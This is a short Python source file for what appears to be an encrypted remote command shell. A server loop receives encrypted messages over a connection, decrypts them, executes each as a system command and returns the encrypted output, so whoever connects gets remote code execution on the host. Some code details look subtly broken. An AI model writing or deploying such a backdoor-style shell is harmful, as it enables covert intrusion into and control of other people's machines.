from Src.Svr import SVR
from Src.Crypt import Crypt
from subprocess import Popen, PIPE

'''
    Executes a given command and returns the output.
    @param cmd: Command to be executed.
    @return: Output of executed command.
'''
def Command(cmd):
    process = Popen([cmd], stdout = PIPE, stderr=PIPE)
    return process.communicate()

'''
    Starting point of the program.
'''
def main():
    server = SVR()
    crypt = Crypt()

    conn, addr = server.initiate()

    while True:
        encrypted = conn.recv(1024)
        decrypted = crypt.decryptData(encrypted)
        output = Command(decrypted)
        conn.send(crypt.encryptData(output))
